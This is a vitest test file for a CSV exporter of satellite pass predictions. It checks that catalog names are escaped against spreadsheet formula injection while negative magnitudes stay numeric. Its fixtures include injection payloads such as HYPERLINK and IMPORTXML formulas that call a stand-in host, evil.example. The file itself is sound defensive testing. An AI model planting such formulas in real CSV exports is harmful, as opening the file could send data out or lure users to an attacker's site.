/**
 * Pass predictions → CSV (src/features/pass-prediction/pass-csv.ts).
 *
 * Names come from a third party's catalog, so the file must be safe to open in
 * a spreadsheet whatever they contain (OWASP "CSV Injection"), without turning
 * real numbers - negative magnitudes included - into text.
 */

import { describe, expect, it } from "vitest";
import { csvCell, passesCsv, type CsvSatellite } from "@/features/pass-prediction/pass-csv";
import type { PassCardData } from "@/features/pass-prediction/sky-words";

const pass: PassCardData = {
  riseTime: "2026-11-13T01:15:22.400Z",
  maxTime: "2026-11-13T01:18:30.000Z",
  maxElevationDeg: 63,
  setTime: "2026-11-13T01:21:40.000Z",
  truncated: "none",
  azimuthAtRiseDeg: 225,
  azimuthAtMaxDeg: 160,
  azimuthAtSetDeg: 70,
  visibility: {
    fromGround: true,
    bestEstimatedMagnitude: -3.4,
    bestTimeIso: "2026-11-13T01:18:30.000Z",
    sunElevationDegAtApex: -14,
    satelliteInShadowAtApex: false,
    reasonIfNotVisible: null,
    visibleWindow: null,
    skyTrack: [],
  },
};

const iss: CsvSatellite = { satelliteNumber: "25544", name: "ISS (ZARYA)", passes: [pass] };

/** Minimal RFC 4180 reader, enough to check what a spreadsheet would see. */
function parse(csv: string): string[][] {
  const rows: string[][] = [];
  let row: string[] = [];
  let cell = "";
  let quoted = false;
  for (let i = 0; i < csv.length; i++) {
    const c = csv[i];
    if (quoted && c === '"' && csv[i + 1] === '"') {
      cell += '"';
      i++;
    } else if (c === '"') {
      quoted = !quoted;
    } else if (!quoted && c === ",") {
      row.push(cell);
      cell = "";
    } else if (!quoted && c === "\r" && csv[i + 1] === "\n") {
      row.push(cell);
      rows.push(row);
      row = [];
      cell = "";
      i++;
    } else {
      cell += c;
    }
  }
  row.push(cell);
  rows.push(row);
  return rows;
}

describe("csvCell", () => {
  it.each([
    ["=HYPERLINK(\"http://evil.example\",\"click\")", "\"'=HYPERLINK(\"\"http://evil.example\"\",\"\"click\"\")\""],
    ["+1+cmd", "'+1+cmd"],
    ["-2+3", "'-2+3"],
    ["@SUM(A1)", "'@SUM(A1)"],
    ["\t=1", "'\t=1"],
    ["\r=1", "\"'\r=1\""],
  ])("defuses %j", (value, written) => {
    expect(csvCell(value)).toBe(written);
  });

  it.each(["-3.40", "-3", "63.00", "0", "ISS (ZARYA)", "2026-11-13T01:15:22.400Z", ""])("leaves %j as it is", (value) => {
    expect(csvCell(value)).toBe(value);
  });

  it("quotes commas, quotes and line breaks", () => {
    expect(csvCell('A, "B"\nC')).toBe('"A, ""B""\nC"');
  });
});

describe("passesCsv", () => {
  it("writes one row per pass under a fixed header, CRLF-separated", () => {
    const rows = parse(passesCsv([iss]));
    expect(rows[0]?.[0]).toBe("satellite_number");
    expect(rows[1]).toEqual([
      "25544",
      "ISS (ZARYA)",
      "2026-11-13T01:15:22.400Z",
      "225.00",
      "2026-11-13T01:18:30.000Z",
      "63.00",
      "160.00",
      "2026-11-13T01:21:40.000Z",
      "70.00",
      "none",
      "yes",
      "-3.40", // still a number a spreadsheet can sort and chart
    ]);
    expect(rows.every((row) => row.length === rows[0]!.length)).toBe(true);
  });

  it("writes a hostile catalog name as text, not a formula", () => {
    const rows = parse(passesCsv([{ ...iss, name: '=IMPORTXML("http://evil.example","//a")' }]));
    expect(rows[1]?.[1]).toBe('\'=IMPORTXML("http://evil.example","//a")');
    expect(rows).toHaveLength(2);
  });

  it("names a nameless object by number and records a failure as a row", () => {
    const rows = parse(passesCsv([{ satelliteNumber: "00005", name: "", passes: [], failure: { reason: "not-found" } }]));
    expect(rows[1]?.slice(0, 2)).toEqual(["00005", "NORAD 00005"]);
    expect(rows[1]?.[9]).toBe("error: not-found");
  });

  it("leaves unknown values empty rather than inventing them", () => {
    const truncated: PassCardData = { ...pass, riseTime: null, azimuthAtRiseDeg: null, truncated: "rise", visibility: undefined };
    const row = parse(passesCsv([{ ...iss, passes: [truncated] }]))[1];
    expect(row?.[2]).toBe("");
    expect(row?.[3]).toBe("");
    expect(row?.[10]).toBe("");
    expect(row?.[11]).toBe("");
  });
});
